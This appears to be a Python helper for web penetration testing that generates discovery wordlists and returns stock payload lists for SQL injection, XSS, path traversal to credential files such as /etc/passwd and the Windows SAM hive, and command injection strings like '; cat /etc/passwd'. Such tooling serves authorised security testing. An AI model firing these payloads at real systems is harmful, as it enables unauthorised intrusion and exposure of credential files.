import os
import logging
import random
import string
from typing import List, Dict, Any, Optional
from pathlib import Path

class WordlistGenerator:
    def __init__(self, wordlists_dir: str = "wordlists"):
        self.wordlists_dir = Path(wordlists_dir)
        self.wordlists_dir.mkdir(exist_ok=True)
        
        # Common wordlists
        self.common_paths = [
            'admin', 'login', 'logout', 'register', 'profile', 'dashboard',
            'api', 'v1', 'v2', 'rest', 'graphql', 'swagger', 'docs',
            'backup', 'bak', 'old', 'temp', 'tmp', 'test', 'dev',
            'config', 'conf', 'settings', 'setup', 'install',
            'phpmyadmin', 'wp-admin', 'administrator', 'manager',
            'user', 'users', 'member', 'members', 'account', 'accounts'
        ]
        
        self.common_extensions = [
            '', '.php', '.html', '.htm', '.asp', '.aspx', '.jsp', '.jspx',
            '.cgi', '.pl', '.py', '.rb', '.js', '.json', '.xml', '.txt',
            '.log', '.bak', '.backup', '.old', '.tmp', '.temp'
        ]
        
        self.common_parameters = [
            'id', 'user', 'username', 'password', 'email', 'name',
            'search', 'q', 'query', 'keyword', 'term', 'file', 'path',
            'page', 'p', 'page_id', 'post', 'article', 'news',
            'category', 'cat', 'tag', 'tags', 'sort', 'order', 'filter',
            'redirect', 'url', 'link', 'href', 'src', 'action',
            'callback', 'jsonp', 'cb', 'return', 'next', 'target'
        ]
    
    def generate_path_wordlist(self, base_paths: Optional[List[str]] = None, 
                              extensions: Optional[List[str]] = None) -> List[str]:
        """Generate wordlist for path discovery"""
        if base_paths is None:
            base_paths = self.common_paths
        
        if extensions is None:
            extensions = self.common_extensions
        
        wordlist = []
        
        # Add base paths
        wordlist.extend(base_paths)
        
        # Add paths with extensions
        for path in base_paths:
            for ext in extensions:
                wordlist.append(f"{path}{ext}")
        
        # Add common variations
        for path in base_paths:
            wordlist.extend([
                f"{path}/",
                f"{path}.php",
                f"{path}.html",
                f"{path}.asp",
                f"{path}.jsp",
                f"{path}.txt",
                f"{path}.bak",
                f"{path}.old",
                f"{path}_backup",
                f"{path}.backup"
            ])
        
        return list(set(wordlist))  # Remove duplicates
    
    def generate_parameter_wordlist(self, base_params: Optional[List[str]] = None) -> List[str]:
        """Generate wordlist for parameter discovery"""
        if base_params is None:
            base_params = self.common_parameters
        
        wordlist = []
        
        # Add base parameters
        wordlist.extend(base_params)
        
        # Add common variations
        for param in base_params:
            wordlist.extend([
                param,
                f"{param}[]",
                f"{param}[0]",
                f"{param}[1]",
                f"{param}_id",
                f"{param}id",
                f"{param}_name",
                f"{param}name",
                f"{param}_type",
                f"{param}type"
            ])
        
        return list(set(wordlist))
    
    def generate_sqli_payloads(self, count: int = 50) -> List[str]:
        """Generate SQL injection payloads"""
        payloads = [
            "'",
            "''",
            "`",
            "``",
            ",",
            "\\",
            "%27",
            "%25%27",
            "%60",
            "%5C",
            "';--",
            "';#",
            "';/*",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "admin'--",
            "admin'#",
            "admin'/*",
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "1 UNION SELECT NULL--",
            "1 UNION SELECT NULL,NULL--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "1' AND 1=1#",
            "1' AND 1=1/*",
            "1' AND '1'='2",
            "1' AND 1=2--",
            "1' AND 1=2#",
            "1' AND 1=2/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' GROUP BY 1--",
            "1' GROUP BY 2--",
            "1' GROUP BY 3--",
            "1' HAVING 1=1--",
            "1' HAVING 1=2--",
            "1' LIMIT 1--",
            "1' LIMIT 1,1--",
            "1' LIMIT 1 OFFSET 1--"
        ]
        
        # Add time-based payloads
        time_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SLEEP(5)--",
            "'; BENCHMARK(5000000,MD5(1))--",
            "'; pg_sleep(5)--",
            "'; SELECT pg_sleep(5)--"
        ]
        
        payloads.extend(time_payloads)
        
        # Add boolean-based payloads
        boolean_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "' OR 1=1--",
            "' OR 1=2--",
            "' OR 'a'='a",
            "' OR 'a'='b"
        ]
        
        payloads.extend(boolean_payloads)
        
        return payloads[:count]
    
    def generate_xss_payloads(self, count: int = 50) -> List[str]:
        """Generate XSS payloads"""
        payloads = [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(`XSS`)</script>",
            "<script>alert(\"XSS\")</script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert(1)>",
            "<iframe src=javascript:alert('XSS')>",
            "<object onerror=alert(1)>",
            "<object onerror=alert('XSS')>",
            "<embed src=javascript:alert(1)>",
            "<embed src=javascript:alert('XSS')>",
            "<form onsubmit=alert(1)><input type=submit>",
            "<form onsubmit=alert('XSS')><input type=submit>",
            "<input onfocus=alert(1) autofocus>",
            "<input onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert(1) autofocus></textarea>",
            "<textarea onfocus=alert('XSS') autofocus></textarea>",
            "<select onfocus=alert(1) autofocus><option>test</option></select>",
            "<select onfocus=alert('XSS') autofocus><option>test</option></select>",
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "javascript:alert(`XSS`)",
            "javascript:alert(\"XSS\")",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert(1)",
            "vbscript:alert('XSS')",
            "onload=alert(1)",
            "onload=alert('XSS')",
            "onerror=alert(1)",
            "onerror=alert('XSS')",
            "onfocus=alert(1)",
            "onfocus=alert('XSS')",
            "onblur=alert(1)",
            "onblur=alert('XSS')",
            "onclick=alert(1)",
            "onclick=alert('XSS')",
            "onmouseover=alert(1)",
            "onmouseover=alert('XSS')",
            "onmouseout=alert(1)",
            "onmouseout=alert('XSS')",
            "onkeypress=alert(1)",
            "onkeypress=alert('XSS')",
            "onkeydown=alert(1)",
            "onkeydown=alert('XSS')",
            "onkeyup=alert(1)",
            "onkeyup=alert('XSS')",
            "onsubmit=alert(1)",
            "onsubmit=alert('XSS')",
            "onchange=alert(1)",
            "onchange=alert('XSS')",
            "oninput=alert(1)",
            "oninput=alert('XSS')"
        ]
        
        return payloads[:count]
    
    def generate_lfi_payloads(self, count: int = 50) -> List[str]:
        """Generate Local File Inclusion payloads"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\etc\\passwd",
            "../../../etc/hosts",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../windows/system32/config/sam",
            "..\\..\\..\\windows\\repair\\sam",
            "../../../windows/repair/sam",
            "..\\..\\..\\windows\\system32\\config\\system",
            "../../../windows/system32/config/system",
            "..\\..\\..\\windows\\system32\\config\\security",
            "../../../windows/system32/config/security",
            "..\\..\\..\\windows\\system32\\config\\software",
            "../../../windows/system32/config/software",
            "..\\..\\..\\windows\\system32\\config\\default",
            "../../../windows/system32/config/default",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../windows/system32/drivers/etc/networks",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol",
            "../../../windows/system32/drivers/etc/protocol",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../windows/system32/drivers/etc/services",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts",
            "../../../windows/system32/drivers/etc/lmhosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
            "../../../windows/system32/drivers/etc/networks",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol",
            "../../../windows/system32/drivers/etc/protocol",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\services",
            "../../../windows/system32/drivers/etc/services",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts",
            "../../../windows/system32/drivers/etc/lmhosts"
        ]
        
        return payloads[:count]
    
    def generate_rce_payloads(self, count: int = 30) -> List[str]:
        """Generate Remote Code Execution payloads"""
        payloads = [
            "; ls",
            "; ls -la",
            "; ls -la /",
            "; cat /etc/passwd",
            "; cat /etc/hosts",
            "; whoami",
            "; id",
            "; pwd",
            "; uname -a",
            "; ps aux",
            "; netstat -an",
            "; ifconfig",
            "; ip addr",
            "; route -n",
            "; df -h",
            "; free -m",
            "; top",
            "; w",
            "; last",
            "; history",
            "| ls",
            "| ls -la",
            "| cat /etc/passwd",
            "| whoami",
            "| id",
            "| pwd",
            "| uname -a",
            "| ps aux",
            "| netstat -an",
            "| ifconfig",
            "| ip addr",
            "| route -n",
            "| df -h",
            "| free -m",
            "| top",
            "| w",
            "| last",
            "| history",
            "`ls`",
            "`ls -la`",
            "`cat /etc/passwd`",
            "`whoami`",
            "`id`",
            "`pwd`",
            "`uname -a`",
            "`ps aux`",
            "`netstat -an`",
            "`ifconfig`",
            "`ip addr`",
            "`route -n`",
            "`df -h`",
            "`free -m`",
            "`top`",
            "`w`",
            "`last`",
            "`history`",
            "$(ls)",
            "$(ls -la)",
            "$(cat /etc/passwd)",
            "$(whoami)",
            "$(id)",
            "$(pwd)",
            "$(uname -a)",
            "$(ps aux)",
            "$(netstat -an)",
            "$(ifconfig)",
            "$(ip addr)",
            "$(route -n)",
            "$(df -h)",
            "$(free -m)",
            "$(top)",
            "$(w)",
            "$(last)",
            "$(history)"
        ]
        
        return payloads[:count]
    
    def save_wordlist(self, wordlist: List[str], filename: str):
        """Save wordlist to file"""
        filepath = self.wordlists_dir / filename
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                for word in wordlist:
                    f.write(f"{word}\n")
            
            logging.info(f"Saved wordlist to {filepath}")
        except Exception as e:
            logging.error(f"Failed to save wordlist: {e}")
    
    def load_wordlist(self, filename: str) -> List[str]:
        """Load wordlist from file"""
        filepath = self.wordlists_dir / filename
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logging.warning(f"Wordlist file {filepath} not found")
            return []
        except Exception as e:
            logging.error(f"Failed to load wordlist: {e}")
            return []
    
    def generate_custom_wordlist(self, base_words: List[str], 
                                mutations: Optional[List[str]] = None,
                                count: Optional[int] = None) -> List[str]:
        """Generate custom wordlist with mutations"""
        if mutations is None:
            mutations = ['', '.php', '.html', '.asp', '.aspx', '.jsp']
        
        wordlist = []
        
        for word in base_words:
            wordlist.append(word)
            for mutation in mutations:
                wordlist.append(word + mutation)
        
        # Remove duplicates
        wordlist = list(set(wordlist))
        
        # Limit count if specified
        if count and len(wordlist) > count:
            wordlist = random.sample(wordlist, count)
        
        return wordlist
    
    def get_wordlist_statistics(self) -> Dict[str, Any]:
        """Get statistics about available wordlists"""
        stats = {
            'total_files': 0,
            'files': [],
            'total_words': 0
        }
        
        if self.wordlists_dir.exists():
            for wordlist_file in self.wordlists_dir.glob("*.txt"):
                try:
                    word_count = len(self.load_wordlist(wordlist_file.name))
                    stats['files'].append({
                        'name': wordlist_file.name,
                        'size': wordlist_file.stat().st_size,
                        'words': word_count
                    })
                    stats['total_words'] += word_count
                    stats['total_files'] += 1
                except Exception as e:
                    logging.error(f"Error processing {wordlist_file}: {e}")
        
        return stats 